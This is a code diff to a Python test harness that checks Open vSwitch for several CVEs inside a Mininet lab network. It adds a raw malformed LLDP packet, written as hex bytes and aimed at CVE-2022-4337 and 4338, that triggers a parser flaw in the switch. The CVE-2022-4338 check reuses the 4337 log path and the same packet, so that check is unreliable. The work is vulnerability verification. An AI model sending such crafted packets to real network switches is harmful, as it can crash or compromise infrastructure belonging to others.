@@ -151,10 +151,18 @@ def cve_2021_3905():
     mininet = MininetNetwork()
     mininet.mininet_2h_1s()
 
-    mininet.net['h2'].cmd('iperf -s -u')
-    mininet.net['h1'].cmd('iperf -c 10.0.0.2 -u -i 1 -l 2000')
+    mininet.net['h2'].cmd('timeout 12 iperf -s -u')
+    mininet.net['h1'].cmd('iperf -c 10.0.0.2 -u -i 1 -l 2000 -t 11')
     
     mininet.stop_mininet()
+
+    vulnerable = False
+    with open(log_path, 'r') as log_file:
+        log_content = log_file.read()
+        error = re.compile(r'8 blocks are definitely lost')
+        if error.search(log_content):
+            vulnerable = True
+
     mininet.cleanup_network()
 
     ovs_config.valgrind_cleanup()
@@ -163,30 +171,67 @@ def cve_2021_3905():
     return vulnerable
 
 def cve_2022_4337():
-    #setLogLevel('info')
+    setLogLevel('info')
 
-    #mininet = MininetNetwork()
-    #mininet.mininet_1h_1s()
+    log_path = ovs_config.set_log_path('cve_2022_4337')
 
-    #mininet.stop_mininet()
-    #mininet.cleanup_network()
+    mininet = MininetNetwork()
+    mininet.mininet_1h_1s()
+
+    os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
+    os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
+
+    #mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
+
+    #sleep(10)
+
+    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e f6 b4 26 aa 5f 00 88 cc 02 07 04 f6 b4 26 aa 5f 00 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
+
+    mininet.stop_mininet()
 
     vulnerable = False
+    with open(log_path, 'r') as log_file:
+        log_content = log_file.read()
+        error = re.compile(r'already past TLV!')
+        if error.search(log_content):
+            vulnerable = True
+
+    mininet.cleanup_network()
+
+    ovs_config.reset_log_path()
+
     return vulnerable
 
 def cve_2022_4338():
-    #setLogLevel('info')
+    setLogLevel('info')
 
-    #mininet = MininetNetwork()
-    #mininet.mininet_1h_1s()
+    log_path = ovs_config.set_log_path('cve_2022_4337')
 
-    #os.system('sudo ovs-vsctl set interface eth0 lldp:enable=true')
-    #os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
+    mininet = MininetNetwork()
+    mininet.mininet_1h_1s()
 
-    #mininet.stop_mininet()
-    #mininet.cleanup_network()
+    os.system('sudo ovs-vsctl set interface s1-eth1 lldp:enable=true')
+    os.system('sudo ovs-vsctl set interface s1 lldp:enable=true')
+
+    #mininet.net['s1'].cmd('sudo wireshark -i s1-eth1 -k &')
+
+    #sleep(10)
+
+    mininet.net['h1'].cmd('python3 packets/sendpkt.py h1-eth0 01 80 c2 00 00 0e f6 b4 26 aa 5f 00 88 cc 02 07 04 f6 b4 26 aa 5f 00 04 03 05 76 32 06 02 00 78 0c 50 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 44 45 41 44 42 45 45 46 fe 05 00 04 0d 0c 01 00 00')
+
+    mininet.stop_mininet()
 
     vulnerable = False
+    with open(log_path, 'r') as log_file:
+        log_content = log_file.read()
+        error = re.compile(r'already past TLV!')
+        if error.search(log_content):
+            vulnerable = True
+
+    mininet.cleanup_network()
+
+    ovs_config.reset_log_path()
+
     return vulnerable
 
 def cve_2022_32166():
@@ -257,5 +302,5 @@ def cve_2023_1668():
 
 # This is for testing purposes:
 if __name__ == '__main__':
-    test = cve_2023_1668()
+    test = cve_2021_3905()
     print(test)
